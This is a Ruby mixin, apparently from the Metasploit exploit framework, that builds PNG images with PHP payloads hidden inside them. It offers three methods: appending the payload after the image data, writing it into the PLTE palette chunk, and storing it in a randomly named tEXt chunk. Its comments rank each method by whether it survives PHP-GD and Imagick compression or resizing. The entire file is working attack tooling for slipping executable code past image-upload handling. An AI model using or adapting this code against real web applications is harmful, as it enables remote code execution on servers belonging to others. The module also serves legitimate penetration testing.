# -*- coding: binary -*-

require 'chunky_png'

module Msf::Exploit::Format::PhpPayloadPng
  # This mixin module provides methods to inject persistent PHP payloads into a PNG file.
  # It is based on the article of Quentin Roland from SynActiv.
  # https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
  # The mixin depends on the GEM libary ChunkyPNG that provides the basic PNG image processing functionality.
  #
  # There are five methods of code injection described in the article:
  # 1: Inject PHP payload into the PNG comment field
  # 2: Inject PHP payload at the end of the PNG file, the so called raw insertion
  # 3: Inject PHP payload in the PLTE chunk of the PNG file
  # 4: Inject PHP payload in the IDAT chunk of the PNG file
  # 5: Inject PHP paylaod in a random tEXT chunk of the PNG file
  #
  # Method 1 and 2 will not survive any image compression configured and applied by a PHP web application
  # Method 3 will survive image compression, but no image resizing configured and applied by a PHP web application
  # Method 4 will survive all compression and resizing but payload is fixed and restricted.
  # Method 5 will survive Imagick resizing

  # In the module below, we will offer only three (3) methods e.g, Raw, PLTE and tEXt for which we will combine method 1 and 5
  # TODO: IDAT chunk payload injection has most potential but is not flexible and is fixed for payloads that can be injected.
  #
  #                     No processing   PHP-GD compression      PHP-GD resizing         Imagick resizing
  # Raw insertion        ✅                    ❌                  ❌                     ❌
  # PLTE chunk           ✅                    ✅                  ❌                     ❌
  # TODO: IDAT chunk     ✅                    ✅                  ✅                     ✅
  # tEXt chunk           ✅                    ❌                  ❌                     ✅
  #
  # inject_php_payload_png(payload, injection_method)
  # @param payload [String] to inserted
  # @param injection_method [String] accepting only standard values 'RAW', 'PLTE', or 'TEXT'
  # @return [Binary String, nil] PNG binary string if injection is succesfull, otherwise return nil with an error message

  def inject_php_payload_png(payload, injection_method)
    if payload.empty?
      print_error('PNG payload creation failed. No PHP payload provided.')
      return nil
    end

    # Execute provided injection method
    case injection_method
    when 'RAW'
      # Inject payload at the end of PNG (raw code injection)
      # create smallest possible PNG image
      image_width = 1
      image_height = 1
      png = ChunkyPNG::Image.new(image_width, image_height, ChunkyPNG::Color::BLACK)

      # add payload at the end of PNG
      png_malicious = png.to_s + payload.to_s
      return png_malicious.to_s

    when 'PLTE'
      # Inject payload in the PLTE chunk
      # payload  should have a length with modulo of 3 to fit the 3 bytes RGB palette
      payload += ' ' while (payload.length % 3) != 0
      # check if payload is not bigger then 768 (3x256) bytes to fit in the PLTE chunk
      if payload.length > 768
        print_error('PNG payload creation failed. The payload is longer then 768 bytes.')
        return nil
      end

      # create base PNG with a right sized PLTE chunk to store the payload
      image_width = payload.length / 3
      image_height = payload.length / 3
      png = ChunkyPNG::Image.new(image_width, image_height, ChunkyPNG::Color::BLACK)

      # create palette entries (max. 256) to host the payload
      for i in 0..(payload.length / 3 - 1) do
        png[i, 1] = ChunkyPNG::Color.rgb(i, 1, 1)
      end

      # cycle thru the chunks, find the PLTE chunk and write the payload
      png_malicious = ChunkyPNG::Datastream.from_blob(png.to_blob)
      png_malicious.each_chunk do |chunk|
        if chunk.type == 'PLTE'
          chunk.content = payload.to_s
        end
      end
      return png_malicious.to_s

    when 'TEXT'
      # Inject payload in a new tEXt chunk generated with a random keyword
      # create smallest possible PNG image
      image_width = 1
      image_height = 1
      png = ChunkyPNG::Image.new(image_width, image_height, ChunkyPNG::Color::BLACK)
      # store payload in a tEXt chunk with a randomized keyword
      random_keyword = Rex::Text.rand_text_alpha(4..16)
      png.metadata[random_keyword] = payload.to_s
      return png.to_s

    else
      print_error("PNG payload creation failed. No valid injection method #{injection_method} provided [RAW, PLTE, TEXT].")
      return nil
    end
  end
end
